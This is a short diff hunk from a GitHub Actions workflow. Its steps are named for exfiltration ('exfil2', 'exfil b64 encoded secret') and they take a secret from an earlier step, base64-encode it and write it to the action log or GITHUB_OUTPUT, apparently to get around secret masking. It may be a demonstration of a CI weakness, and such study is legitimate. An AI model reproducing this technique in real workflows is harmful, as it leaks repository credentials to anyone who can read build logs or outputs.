@@ -29,7 +29,7 @@ jobs:
       - name: Base64 wrap and print to action log
         id: exfil2
         run: |
-          echo  eureka=[${{steps.exfil.outputs.exfilsecret}}]|base64
+          echo  "eureka=[${{steps.exfil.outputs.exfilsecret}}]|base64" >> $GITHUB_OUTPUT
           
       - name: exfil b64 encoded secret
         run: |
